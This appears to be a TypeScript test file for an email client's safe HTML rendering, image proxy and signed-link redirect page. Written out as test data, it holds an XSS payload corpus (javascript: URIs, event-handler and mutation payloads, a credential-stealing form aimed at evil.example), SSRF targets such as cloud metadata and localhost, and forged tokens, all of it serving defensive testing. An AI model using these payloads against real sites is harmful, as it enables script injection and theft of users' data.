import { Hono } from "hono";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  FRAME_SANDBOX,
  frameCsp,
  frameDocument,
  hasBlockedImages,
  proxiedImageSrc,
} from "../../web/src/components/MessageFrame.policy";
import type { AppContext } from "../src/middleware";
import { IMAGE_PROXY_MAX_BYTES, imageProxyRoutes } from "../src/routes/image-proxy";
import { linkRoutes, prepareMailHtml, signLinkToken, urlSigningKey, verifyImageToken, verifyLinkToken } from "../src/routes/link";

/**
 * Safe rendering: the server-side sanitizer and signer, the frame policy the
 * web app renders with, the image proxy and the link page.
 */
const SECRET = "test-only-safe-render-secret-not-real-0000";
const ENV = { BOXOX_SIGNING_SECRET: SECRET };
const ORIGIN = "https://mail.example.test";

const app = new Hono<AppContext>().route("/api/link", linkRoutes).route("/api/image-proxy", imageProxyRoutes);
const request = (path: string, init: RequestInit = {}, env: Record<string, unknown> = ENV) => app.request(path, init, env);

const frameSources = import.meta.glob<string>("../../web/src/components/MessageFrame.tsx", { eager: true, import: "default", query: "?raw" });
const frameSource = Object.values(frameSources)[0]!;

const XSS_CORPUS = [
  `<script>alert(1)</script>`,
  `<SCRIPT SRC=https://evil.example/x.js></SCRIPT>`,
  `<img src=x onerror=alert(1)>`,
  `<img src="x" ONERROR="alert(1)">`,
  `<svg onload=alert(1)><script>alert(2)</script></svg>`,
  `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  `<body onload=alert(1)>hi</body>`,
  `<iframe src="javascript:alert(1)"></iframe>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="javascript:alert(1)"></object>`,
  `<embed src="data:text/html,<script>alert(1)</script>">`,
  `<a href="javascript:alert(1)">click</a>`,
  `<a href="JaVaScRiPt:alert(1)">click</a>`,
  `<a href="jav&#x09;ascript:alert(1)">click</a>`,
  `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>`,
  `<a href=" \u0001javascript:alert(1)">click</a>`,
  `<a href="vbscript:msgbox(1)">click</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
  `<form action="https://evil.example/steal"><input name="password"><button formaction="javascript:alert(1)">Log in</button></form>`,
  `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
  `<base href="javascript:alert(1)//">`,
  `<link rel="stylesheet" href="https://evil.example/x.css">`,
  `<div style="background:url(javascript:alert(1))">x</div>`,
  `<div style="width:expression(alert(1))">x</div>`,
  `<details open ontoggle=alert(1)>`,
  `<video><source onerror=alert(1)></video>`,
  `<scr<script>x</script>ipt>alert(1)</scr<script>x</script>ipt>`,
  `<<script>x</script>script>alert(1)<</script>/script>`,
  `<!--<img src="--><img src=x onerror=alert(1)//">`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
  `<template><script>alert(1)</script></template>`,
  `<p data-boxox-src="https://evil.example/pixel.gif" onclick="alert(1)">x</p>`,
  `<a xlink:href="javascript:alert(1)">x</a>`,
  `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
];

const MUTATION_PAYLOADS = [XSS_CORPUS[27]];

const SCRIPT_TAGS = new Set(["script", "iframe", "frame", "object", "embed", "applet", "form", "input", "button", "base", "link", "svg", "math", "template", "noscript"]);

const decode = (v: string) =>
  v.replace(/&#(x?)([0-9a-f]+);?/gi, (_, hex: string, n: string) => String.fromCodePoint(parseInt(n, hex ? 16 : 10))).replace(/&colon;/gi, ":");

/** Everything in an HTML document that could run script or submit a form, found by a real HTML parser. */
async function executableParts(html: string, opts: { allowCspMeta?: boolean } = {}): Promise<string[]> {
  const found: string[] = [];
  let metas = 0;
  await new HTMLRewriter()
    .on("*", {
      element(el) {
        const tag = el.tagName.toLowerCase();
        if (SCRIPT_TAGS.has(tag)) found.push(`<${tag}>`);
        if (tag === "meta") {
          const equiv = el.getAttribute("http-equiv")?.toLowerCase();
          const allowed = opts.allowCspMeta && ((equiv === "content-security-policy" && metas === 0) || (!equiv && el.hasAttribute("charset")) || el.getAttribute("name") === "referrer");
          metas++;
          if (!allowed) found.push(`<meta ${equiv ?? ""}>`);
        }
        for (const [name = "", value = ""] of el.attributes) {
          const n = name.toLowerCase();
          const v = decode(value).replace(/[\s\u0000-\u001f]/g, "").toLowerCase();
          if (n.startsWith("on")) found.push(`${tag}[${n}]`);
          if (/javascript:|vbscript:|data:text/.test(v) && n !== "title") found.push(`${tag}[${n}=${v}]`);
          if (n === "srcdoc" || n === "formaction" || n === "action") found.push(`${tag}[${n}]`);
          if (n === "style" && /expression\(|javascript:/.test(v)) found.push(`${tag}[style]`);
        }
      },
    })
    .transform(new Response(html))
    .text();
  return found;
}

async function sign(url: string, warn: boolean) {
  const key = await urlSigningKey(ENV, "boxox:link:v1");
  return (await signLinkToken(key!, url, warn))!;
}

const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0]);

afterEach(() => {
  vi.restoreAllMocks();
});

describe("safe rendering", () => {
  it("the XSS payload corpus never executes in the sandboxed frame", async () => {
    // The scanner is real: every raw payload is caught before sanitizing, except
    // the ones built to become script only after a naive strip.
    const uncaught: string[] = [];
    for (const payload of XSS_CORPUS) if (!(await executableParts(payload)).length) uncaught.push(payload);
    expect(uncaught).toEqual(MUTATION_PAYLOADS);

    for (const payload of XSS_CORPUS) {
      for (const links of ["direct", "warn", "disabled"] as const) {
        const safe = await prepareMailHtml(ENV, `<p>Hello</p>${payload}<p>Bye</p>`, { links });
        expect(await executableParts(safe), `${links}: ${payload}`).toEqual([]);
        expect(safe).not.toMatch(/<\s*script/i);
        expect(safe).toContain("Hello");

        const doc = frameDocument(safe, { origin: ORIGIN, showRemote: true });
        expect(await executableParts(doc, { allowCspMeta: true }), payload).toEqual([]);
      }
    }

    // Even if a payload got past both sanitizers, the frame can't run it.
    const tokens = FRAME_SANDBOX.split(/\s+/);
    expect(tokens).not.toContain("allow-scripts");
    expect(tokens).not.toContain("allow-same-origin");
    expect(tokens).not.toContain("allow-forms");
    expect(tokens).not.toContain("allow-top-navigation");
    for (const remote of [false, true]) {
      const csp = frameCsp(ORIGIN, remote);
      expect(csp).toContain("script-src 'none'");
      expect(csp).toContain("default-src 'none'");
      expect(csp).toContain("form-action 'none'");
      expect(csp).toContain("base-uri 'none'");
      const doc = frameDocument("<p>x</p>", { origin: ORIGIN, showRemote: remote });
      expect(doc.startsWith('<!doctype html><html><head><meta http-equiv="Content-Security-Policy"')).toBe(true);
    }

    // The component renders exactly this policy.
    expect(frameSource).toContain("sandbox={FRAME_SANDBOX}");
    expect(frameSource).toContain("srcDoc={doc}");
    expect(frameSource).toMatch(/frameDocument\(sanitize\(html, showRemote\)/);
    expect(frameSource).toMatch(/FORBID_TAGS: \[[^\]]*"script"[^\]]*"form"/);
  });

  it("remote images are blocked by default", async () => {
    const html = [
      `<img src="https://tracker.example/open.gif?u=ann" alt="pixel">`,
      `<img src="//cdn.example/logo.png">`,
      `<img src="http://plain.example/x.png" srcset="https://a.example/1x.png 1x, https://a.example/2x.png 2x">`,
      `<img src="data:image/png;base64,iVBORw0KGgo=">`,
      `<img src="/api/orgs/org1/attachments/att1?inline=1">`,
      `<img src="data:image/svg+xml,<svg onload=alert(1)>">`,
      `<table background="https://tracker.example/bg.png"><tr><td>x</td></tr></table>`,
      `<video poster="https://tracker.example/poster.png"></video>`,
      `<div data-boxox-src="/api/image-proxy/forged.token">forged</div>`,
    ].join("");
    const safe = await prepareMailHtml(ENV, html, { links: "direct" });

    expect(safe).not.toMatch(/src="(https?:)?\/\//i);
    expect(safe).not.toContain("tracker.example");
    expect(safe).not.toContain("srcset");
    expect(safe).not.toContain("forged.token");
    expect(safe).not.toContain("svg");
    expect(safe).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(safe).toContain('src="/api/orgs/org1/attachments/att1?inline=1"');
    expect(hasBlockedImages(safe)).toBe(true);

    // Each held-back image carries a signed proxy path for the original URL, and nothing else.
    const held = [...safe.matchAll(/data-boxox-src="\/api\/image-proxy\/([^"]+)"/g)].map((m) => m[1]!);
    expect(held).toHaveLength(3);
    expect(await Promise.all(held.map((t) => verifyImageToken(ENV, t)))).toEqual([
      "https://tracker.example/open.gif?u=ann",
      "https://cdn.example/logo.png",
      "http://plain.example/x.png",
    ]);
    expect(proxiedImageSrc(`/api/image-proxy/${held[0]}`)).toBe(`/api/image-proxy/${held[0]}`);
    expect(proxiedImageSrc("https://tracker.example/open.gif")).toBeNull();
    expect(proxiedImageSrc("/api/image-proxy/x\" onerror=\"alert(1)")).toBeNull();

    // The frame's CSP allows no remote image host by default, and only the proxy once allowed.
    const blocked = frameCsp(ORIGIN, false);
    const imgSrc = blocked.split("; ").find((d) => d.startsWith("img-src "))!;
    expect(imgSrc).toBe(`img-src data: ${ORIGIN}/api/orgs/`);
    expect(blocked).not.toMatch(/https:(\s|;|$)|\*/);
    const allowed = frameCsp(ORIGIN, true).split("; ").find((d) => d.startsWith("img-src "))!;
    expect(allowed).toBe(`img-src data: ${ORIGIN}/api/orgs/ ${ORIGIN}/api/image-proxy/`);

    // Without a signing key there is no proxy path: remote images just stay off.
    const unsigned = await prepareMailHtml({}, html, { links: "direct" });
    expect(unsigned).not.toContain("tracker.example");
    expect(hasBlockedImages(unsigned)).toBe(false);
  });

  it("the image proxy strips cookies and referrer", async () => {
    const safe = await prepareMailHtml(ENV, `<img src="https://images.example/pic.png?id=7">`, { links: "direct" });
    const path = safe.match(/data-boxox-src="([^"]+)"/)![1]!;

    const seen: Request[] = [];
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
      seen.push(new Request(input as RequestInfo, init));
      return new Response(PNG, {
        headers: {
          "content-type": "text/html",
          "set-cookie": "track=1; Path=/",
          "access-control-allow-origin": "*",
          link: "<https://images.example/x.js>; rel=preload",
        },
      });
    });

    const res = await request(path, {
      headers: {
        cookie: "CF_Authorization=secret-session; other=1",
        referer: `${ORIGIN}/mail/thread/123`,
        "cf-access-jwt-assertion": "jwt-secret",
        "cf-connecting-ip": "203.0.113.9",
        "x-forwarded-for": "203.0.113.9",
        "x-real-ip": "203.0.113.9",
        authorization: "Bearer secret",
        "user-agent": "ReaderBrowser/1.0 (ann's laptop)",
        "accept-language": "en-NZ",
      },
    });
    expect(res.status).toBe(200);
    expect(await res.arrayBuffer()).toEqual(PNG.buffer);

    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const out = seen[0]!;
    expect(out.url).toBe("https://images.example/pic.png?id=7");
    expect(out.method).toBe("GET");
    const sent = Object.fromEntries(out.headers);
    for (const name of ["cookie", "referer", "cf-access-jwt-assertion", "cf-connecting-ip", "x-forwarded-for", "x-real-ip", "authorization", "accept-language"]) {
      expect(sent[name], name).toBeUndefined();
    }
    expect(sent["user-agent"]).not.toContain("ReaderBrowser");
    expect(JSON.stringify(sent)).not.toMatch(/secret|203\.0\.113\.9|thread\/123/);

    // Nothing from the upstream response reaches the reader but the image; the type comes from its bytes.
    expect(res.headers.get("set-cookie")).toBeNull();
    expect(res.headers.get("access-control-allow-origin")).toBeNull();
    expect(res.headers.get("link")).toBeNull();
    expect(res.headers.get("content-type")).toBe("image/png");
    expect(res.headers.get("referrer-policy")).toBe("no-referrer");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain("sandbox");

    // Unsigned or altered URLs are never fetched.
    fetchSpy.mockClear();
    expect((await request("/api/image-proxy/eyJ1IjoiaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5wbmcifQ.AAAA")).status).toBe(403);
    expect((await request(`${path}x`)).status).toBe(403);
    expect((await request(path, {}, {})).status).toBe(403);
    expect(fetchSpy).not.toHaveBeenCalled();

    // Size, type and private hosts are bounded.
    fetchSpy.mockImplementation(async () => new Response(new Uint8Array(IMAGE_PROXY_MAX_BYTES + 1)));
    expect((await request(path)).status).toBe(413);
    fetchSpy.mockImplementation(async () => new Response('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', { headers: { "content-type": "image/svg+xml" } }));
    expect((await request(path)).status).toBe(415);
    fetchSpy.mockImplementation(async () => new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data" } }));
    expect((await request(path)).status).toBe(400);
    const internal = (await prepareMailHtml(ENV, `<img src="http://127.0.0.1/admin.png">`, { links: "direct" })).match(/data-boxox-src="([^"]+)"/)![1]!;
    fetchSpy.mockClear();
    expect((await request(internal)).status).toBe(400);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("the link warning page only follows signed urls", async () => {
    const target = "https://shop.example.com/order?id=7&t=1";

    // Normal mail: a signed link redirects straight there, with no referrer.
    const direct = await request(`/api/link/${await sign(target, false)}`);
    expect(direct.status).toBe(302);
    expect(direct.headers.get("location")).toBe(target);
    expect(direct.headers.get("referrer-policy")).toBe("no-referrer");

    // Flagged mail: the page shows the real destination and waits for the reader.
    const warned = await request(`/api/link/${await sign(target, true)}`);
    expect(warned.status).toBe(200);
    expect(warned.headers.get("location")).toBeNull();
    const page = await warned.text();
    expect(page).toContain("shop.example.com");
    expect(page).toContain('href="https://shop.example.com/order?id=7&amp;t=1"');
    expect(page).toContain('rel="noopener noreferrer"');
    expect(warned.headers.get("content-security-policy")).toContain("default-src 'none'");

    // Anything we didn't sign is refused, never followed.
    const evil = btoa(JSON.stringify({ u: "https://evil.example/login" })).replace(/=+$/, "");
    const tampered = (await sign(target, false)).replace(/^[^.]+/, evil);
    const forgedKey = await urlSigningKey({ BOXOX_SIGNING_SECRET: "some-other-secret-not-ours-000000" }, "boxox:link:v1");
    const forged = (await signLinkToken(forgedKey!, "https://evil.example/login", false))!;
    for (const token of [evil, `${evil}.AAAA`, tampered, forged, "https%3A%2F%2Fevil.example", "..%2F..%2Fevil"]) {
      const res = await request(`/api/link/${token}`);
      expect(res.status, token).toBe(400);
      expect(res.headers.get("location")).toBeNull();
      expect(await res.text()).not.toContain("evil.example");
    }
    expect((await request(`/api/link/${await sign(target, false)}`, {}, {})).status).toBe(400);
    expect((await request("/api/link/x?u=https://evil.example")).status).toBe(400);

    // Only http(s) can be signed at all.
    const key = await urlSigningKey(ENV, "boxox:link:v1");
    expect(await signLinkToken(key!, "javascript:alert(1)", false)).toBeNull();
    expect(await signLinkToken(key!, "data:text/html,<script>alert(1)</script>", false)).toBeNull();

    // The sanitizer points every link at a signed URL for the same destination; spam warns, Quarantine has no links.
    const mail = `<a href="${target.replace("&", "&amp;")}">Your order</a> <a href="mailto:help@example.com">Help</a> <a href="#top">Top</a>`;
    for (const [links, warn] of [["direct", undefined], ["warn", 1]] as const) {
      const safe = await prepareMailHtml(ENV, mail, { links });
      const token = safe.match(/href="\/api\/link\/([^"]+)"/)![1]!;
      expect(await verifyLinkToken(ENV, token)).toEqual(warn ? { u: target, w: 1 } : { u: target });
      expect(safe).toContain('target="_blank"');
      expect(safe).toContain('rel="noopener noreferrer"');
      expect(safe).toContain('href="mailto:help@example.com"');
      expect(safe).not.toContain('href="https://');
    }
    const quarantined = await prepareMailHtml(ENV, mail, { links: "disabled" });
    expect(quarantined).not.toMatch(/href="(?!#)/);
    expect(quarantined).toContain("Your order");
  });
});
